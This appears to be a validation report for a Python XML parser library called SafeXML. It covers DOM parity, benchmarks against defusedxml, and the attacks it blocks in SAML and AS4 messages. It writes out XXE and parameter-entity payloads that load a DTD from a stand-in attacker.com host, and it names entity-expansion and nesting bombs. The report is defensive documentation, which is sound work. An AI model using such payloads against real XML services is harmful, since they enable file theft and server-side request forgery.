# Industrial Schema & Real-World Payload Validation Report

SafeXML is validated against real-world enterprise schemas and payloads aggregated in **[polyxml/polyxml-schema-corpus](https://github.com/polyxml/polyxml-schema-corpus)**.

This report documents DOM equivalence across multi-namespace industrial schemas, adversarial injection defense in SAML 2.0 / AS4 ebMS3 message envelopes, and large-document throughput and memory profiling.

---

## 1. Domain Coverage

SafeXML is validated across 18 enterprise domains and 596 schemas:

| Industry Domain | Standard / Schema | Representative File | Size | Namespaces |
| :--- | :--- | :--- | :--- | :--- |
| **Defense & Aerospace** | NATO / DoD UCI 2.5 | `defense-uci/UCI_MessageDefinitions_v2_5_0.xsd` | **8.09 MB** | Multi (`uci`, `xs`) |
| **Healthcare** | HL7 FHIR R4 | `hl7-fhir/fhir-single.xsd` | **2.60 MB** | Multi (`fhir`, `xhtml`, `xs`) |
| **Supply Chain / Invoicing** | OASIS UBL 2.1 | `ubl-2.1/common/UBL-CommonAggregateComponents-2.1.xsd` | **2.36 MB** | Multi (`cac`, `cbc`, `ext`) |
| **Financial Derivatives** | ISDA FpML 5.12 | `finance-fpml/fpml-loan-5-12.xsd` | **310 KB** | Multi (`fpml`, `dsig`) |
| **SEPA Banking & Payments** | ISO 20022 pacs.008 / camt.054 | `iso20022/camt.054.001.08.xsd` | **99 KB** | Single / Multi (`camt`) |
| **Aviation & ATM** | ICAO / FAA FIXM 4.0 | `aviation-fixm/core/Fixm.xsd` | **15 KB** | Multi (`fx`, `fb`, `mesg`) |
| **Rail Transport** | railML 2.4 | `transit-railml/railML.xsd` | **21 KB** | Multi (`rail`, `xs`) |
| **Identity & Access** | OASIS SAML 2.0 | `security-saml/saml-schema-assertion-2.0.xsd` | **16 KB** | Multi (`saml`, `dsig`) |
| **B2B Messaging** | OASIS ebMS 3.0 / AS4 | `messaging-as4/ebms-header-3_0.xsd` | **15 KB** | Multi (`eb`, `soap`) |

---

## 2. DOM Parity & Structural Equivalence

SafeXML verifies complete DOM equivalence against Python standard library `xml.etree.ElementTree`:
* **Exact tag matching**: Every element tag, including namespace-expanded URI prefixes (`{http://...}Tag`), matches stdlib exactly.
* **Exact attribute matching**: All element attributes match across namespaces and default declarations.
* **Text and tail parity**: Normalization, whitespace handling, and character content match 100%.
* **Child element ordering**: Recursive tree structures match with zero variance across all schemas and real-world instance payloads (`uci_entity.xml`, `pacs_008_customer_credit_transfer.xml`, `siri_vehicle_monitoring.xml`).

---

## 3. Adversarial Injection Hardening in SAML & AS4

Enterprise protocols like SAML 2.0 and AS4 are primary targets for XML-based attacks. SafeXML guarantees proactive defense when processing adversarial payloads:

### A. OASIS SAML 2.0 Authentication Tokens
1. **XXE via DTD SYSTEM Entity**:
   * *Vector*: Attacker injects `<!DOCTYPE samlp:Response SYSTEM "http://attacker.com/evil.dtd">` to exfiltrate files or perform SSRF.
   * *Defense*: SafeXML raises `safexml.ExternalReferenceForbidden` before entity dereference.
2. **Billion Laughs Exponential Entity Expansion**:
   * *Vector*: Attacker injects nested entities (`&lol4;` expanding to millions of tokens) inside `<saml:Subject>`.
   * *Defense*: SafeXML raises `safexml.EntitiesForbidden` by default.
3. **Quadratic Blowup Attack**:
   * *Vector*: Attacker injects repeated medium-sized entities inside `<saml:AttributeValue>`.
   * *Defense*: Blocked by default entity forbidding and amplification threshold monitoring (`max_entity_size`).
4. **Attribute Flood Hash-DoS (CWE-400)**:
   * *Vector*: Attacker injects 1,500 attributes into `<saml:Assertion>` to exhaust CPU during hash lookups.
   * *Defense*: SafeXML rejects the payload with `safexml.AttributeLimitExceeded(1000)`.
5. **Deep Nesting Recursion Bomb**:
   * *Vector*: Attacker injects 200+ nested `<saml:AuthnContext>` tags.
   * *Defense*: SafeXML rejects the payload with `safexml.DepthLimitExceeded(100)`.

### B. OASIS AS4 ebMS 3.0 SOAP Envelopes
1. **Parameter Entity Injection**:
   * *Vector*: Attacker declares `<!ENTITY % pe SYSTEM "http://attacker.com/evil.dtd"> %pe;` inside SOAP envelope.
   * *Defense*: SafeXML blocks parameter entity reference with `safexml.ExternalReferenceForbidden`.
2. **Oversized Identifier / Tag Name Bomb**:
   * *Vector*: Attacker crafts a SOAP Body element with a 2,000-character tag name.
   * *Defense*: SafeXML blocks the document with `safexml.NameLimitExceeded(1024)`.

---

## 4. Performance & Memory Profiling

Benchmarks executed on Linux x86_64 across industrial schema documents:

| Document | File Size | SafeXML Parse Time | `defusedxml` Parse Time | SafeXML Throughput | 4-Worker Concurrency Speedup |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **`UCI_MessageDefinitions_v2_5_0.xsd`** | **8.09 MB** | **190.9 ms** | 164.6 ms | **41.4 MB/s** | **1.41x FASTER** 🚀 |
| **`fhir-single.xsd`** | **2.60 MB** | **67.6 ms** | 61.5 ms | **37.5 MB/s** | **1.42x FASTER** 🚀 |
| **`UBL-CommonAggregateComponents-2.1.xsd`** | **2.36 MB** | **54.0 ms** | 49.0 ms | **42.8 MB/s** | **1.57x FASTER** 🚀 |
| **`fpml-loan-5-12.xsd`** | **310.4 KB** | **9.8 ms** | 8.3 ms | **31.0 MB/s** | **1.48x FASTER** 🚀 |
| **`camt.054.001.08.xsd`** | **98.9 KB** | **4.6 ms** | 2.9 ms | **21.2 MB/s** | **1.66x FASTER** 🚀 |
| **`railML.xsd`** | **21.2 KB** | **0.6 ms** | 0.5 ms | **35.7 MB/s** | **1.19x FASTER** 🚀 |

### Key Performance Takeaways:
1. **High Parsing Throughput**: SafeXML delivers **31 to 43 MB/s parsing throughput** on complex, multi-megabyte schemas.
2. **Multi-Threaded Scalability**: Under multi-worker concurrency, `defusedxml` suffers severe GIL contention. SafeXML achieves **1.4x to 1.66x higher concurrent throughput** under standard `ThreadPoolExecutor` workloads.
3. **Bounded Memory Footprint**: Peak RSS scales linearly with document size without exponential memory amplification.

---

## 5. Reproduction

```bash
# Run automated pytest validation suite
uv run pytest tests/test_industrial_corpus.py -v

# Run performance and memory profiling benchmark
uv run python scripts/run_industrial_benchmark.py
```
